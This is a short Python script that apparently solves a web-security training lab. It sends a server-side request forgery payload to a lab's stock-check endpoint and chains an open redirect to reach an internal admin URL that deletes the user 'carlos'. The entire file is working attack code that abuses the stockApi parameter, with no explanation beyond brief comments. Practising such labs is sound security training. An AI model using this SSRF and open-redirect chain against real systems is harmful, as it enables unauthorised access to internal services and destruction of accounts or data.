import requests

# Lab stock check endpoint
stock_url = 'https://0a5100150446d3fd821ecaf7009600de.web-security-academy.net/product/stock'

# Internal admin deletion URL
delete_url = 'http://192.168.0.12:8080/admin/delete?username=carlos'

# Craft the redirect path through the open redirection vulnerability
page = '/product/nextProduct'
parameter = 'path'
open_redir_path = f'{page}?{parameter}={delete_url}'

# Submit the SSRF payload
stockapi_data = {
    'stockApi': open_redir_path
}

resp = requests.post(stock_url, data=stockapi_data)

print("[*] SSRF via open redirection attempt complete.")
print(f"Status Code: {resp.status_code}")
print(resp.text)
